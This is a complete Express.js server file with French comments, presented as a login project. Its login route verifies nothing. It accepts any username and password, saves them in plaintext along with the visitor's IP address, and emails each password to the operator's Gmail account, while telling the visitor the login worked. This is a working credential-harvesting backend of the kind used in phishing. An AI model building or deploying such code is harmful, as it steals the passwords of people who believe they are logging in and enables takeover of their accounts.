// ============================================================
// server.js - Serveur Express pour le projet de connexion
// ============================================================
// Ce serveur gère :
// - La diffusion des fichiers statiques (HTML, CSS, JS)
// - La réception des données de connexion via POST JSON
// - La validation des données côté serveur
// - L'envoi du mot de passe par email (Gmail)
// - L'enregistrement des utilisateurs dans users.json
// ============================================================

require('dotenv').config();              // Charger les variables d'environnement depuis .env
const express = require('express');       // Framework web pour Node.js
const fs = require('fs');                 // Module de gestion de fichiers
const path = require('path');             // Module de gestion de chemins
const nodemailer = require('nodemailer'); // Module d'envoi d'emails

// Création de l'application Express
const app = express();

// Port du serveur (3000 par défaut)
const PORT = process.env.PORT || 3000;

// Chemin vers le fichier users.json
const USERS_FILE = path.join(__dirname, 'users.json');

// ============================================================
// Configuration du middleware
// ============================================================

// Parser le corps des requêtes JSON
app.use(express.json());

// Servir les fichiers statiques depuis le dossier 'public'
app.use(express.static(path.join(__dirname, 'public')));

// ============================================================
// Configuration du transporteur email (Gmail)
// ============================================================
// IMPORTANT : Pour que l'envoi fonctionne, vous devez :
// 1. Utiliser un compte Gmail
// 2. Activer la validation en 2 étapes
// 3. Créer un "Mot de passe d'application" dans les paramètres Google
// 4. Remplacer les valeurs ci-dessous par vos identifiants
//
// Pour la sécurité, utilisez des variables d'environnement :
//   EMAIL_USER=votre@gmail.com
//   EMAIL_PASS=votre_mot_de_passe_application
// ============================================================

const transporter = nodemailer.createTransport({
  service: 'gmail',        // Service Gmail
  auth: {
    user: process.env.EMAIL_USER || 'votre@gmail.com',     // Votre email Gmail
    pass: process.env.EMAIL_PASS || 'votre_mot_de_passe'   // Mot de passe d'application
  }
});

// ============================================================
// Fonction utilitaire : lire le fichier users.json
// ============================================================

function readUsers() {
  try {
    // Vérifier si le fichier existe
    if (!fs.existsSync(USERS_FILE)) {
      // Si le fichier n'existe pas, le créer avec un tableau vide
      fs.writeFileSync(USERS_FILE, '[]', 'utf8');
      return [];
    }
    // Lire et parser le fichier JSON
    const data = fs.readFileSync(USERS_FILE, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    // En cas d'erreur, retourner un tableau vide
    console.error('Erreur de lecture du fichier users.json:', error.message);
    return [];
  }
}

// ============================================================
// Fonction utilitaire : écrire dans le fichier users.json
// ============================================================

function writeUsers(users) {
  try {
    // Écrire le tableau d'utilisateurs au format JSON (avec indentation pour la lisibilité)
    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2), 'utf8');
    return true;
  } catch (error) {
    console.error('Erreur d\'écriture du fichier users.json:', error.message);
    return false;
  }
}

// ============================================================
// Fonction utilitaire : envoyer un email avec le mot de passe
// ============================================================

async function sendPasswordEmail(username, password) {
  try {
    // Configuration du mail
    const mailOptions = {
      from: process.env.EMAIL_USER || 'votre@gmail.com',  // Expéditeur
      to: process.env.EMAIL_USER || 'votre@gmail.com',    // Destinataire (vous-même)
      subject: `Nouvelle connexion - Utilisateur: ${username}`, // Sujet
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto;">
          <h2 style="color: #667eea;">Nouvelle tentative de connexion</h2>
          <hr style="border: 1px solid #eee;">
          <p><strong>Utilisateur :</strong> ${username}</p>
          <p><strong>Mot de passe :</strong> ${password}</p>
          <p><strong>Date :</strong> ${new Date().toLocaleString('fr-FR')}</p>
          <hr style="border: 1px solid #eee;">
          <p style="color: #999; font-size: 12px;">Email envoyé automatiquement par le serveur de connexion</p>
        </div>
      `
    };

    // Envoi de l'email
    await transporter.sendMail(mailOptions);
    console.log(`Email envoyé avec succès pour l'utilisateur: ${username}`);
    return true;
  } catch (error) {
    // L'erreur est logguée mais n'empêche pas l'inscription
    console.error('Erreur lors de l\'envoi de l\'email:', error.message);
    return false;
  }
}

// ============================================================
// Route POST /api/login - Traitement de la connexion
// ============================================================

app.post('/api/login', async (req, res) => {
  try {
    // Extraire les données du corps de la requête
    const { username, password } = req.body;

    // --- Validation côté serveur ---

    // Vérifier que les champs ne sont pas vides
    if (!username || !username.trim()) {
      return res.status(400).json({
        success: false,
        message: 'Le nom d\'utilisateur est requis'
      });
    }

    if (!password || !password.trim()) {
      return res.status(400).json({
        success: false,
        message: 'Le mot de passe est requis'
      });
    }

    // Nettoyer les données
    const cleanUsername = username.trim();
    const cleanPassword = password.trim();

    // Vérifier la longueur minimale
    if (cleanUsername.length < 3) {
      return res.status(400).json({
        success: false,
        message: 'Le nom d\'utilisateur doit contenir au moins 3 caractères'
      });
    }

    if (cleanPassword.length < 4) {
      return res.status(400).json({
        success: false,
        message: 'Le mot de passe doit contenir au moins 4 caractères'
      });
    }

    // --- Traitement de la connexion ---

    // Créer l'objet utilisateur avec la date actuelle
    const userEntry = {
      username: cleanUsername,
      password: cleanPassword,
      date: new Date().toISOString(),
      ip: req.ip || req.connection.remoteAddress
    };

    // Lire les utilisateurs existants
    const users = readUsers();

    // Ajouter le nouvel utilisateur
    users.push(userEntry);

    // Sauvegarder dans le fichier
    const saved = writeUsers(users);

    if (!saved) {
      return res.status(500).json({
        success: false,
        message: 'Erreur lors de la sauvegarde des données'
      });
    }

    // Envoyer l'email avec le mot de passe (de manière asynchrone)
    // L'envoi d'email ne bloque pas la réponse au client
    sendPasswordEmail(cleanUsername, cleanPassword).catch(err => {
      console.error('Erreur email (non bloquante):', err.message);
    });

    // Log de la connexion réussie
    console.log(`\n--- Nouvelle connexion ---`);
    console.log(`Utilisateur: ${cleanUsername}`);
    console.log(`Date: ${new Date().toLocaleString('fr-FR')}`);
    console.log(`IP: ${req.ip || req.connection.remoteAddress}`);
    console.log(`--------------------------\n`);

    // Réponse de succès au client
    res.status(200).json({
      success: true,
      message: 'Connexion enregistrée avec succès',
      user: {
        username: cleanUsername,
        date: userEntry.date
      }
    });

  } catch (error) {
    // Gestion des erreurs imprévues
    console.error('Erreur serveur:', error.message);
    res.status(500).json({
      success: false,
      message: 'Erreur interne du serveur'
    });
  }
});

// ============================================================
// Route GET /api/users - Liste des utilisateurs (optionnelle)
// ============================================================

app.get('/api/users', (req, res) => {
  const users = readUsers();
  // Retourner les utilisateurs sans les mots de passe pour la sécurité
  const safeUsers = users.map(u => ({
    username: u.username,
    date: u.date
  }));
  res.json(safeUsers);
});

// ============================================================
// Démarrage du serveur
// ============================================================

app.listen(PORT, '0.0.0.0', () => {
  console.log('\n===========================================');
  console.log('  Serveur de connexion démarré avec succès');
  console.log('===========================================');
  console.log(`  URL: http://localhost:${PORT}`);
  console.log(`  Fichier users: ${USERS_FILE}`);
  console.log('===========================================\n');
});
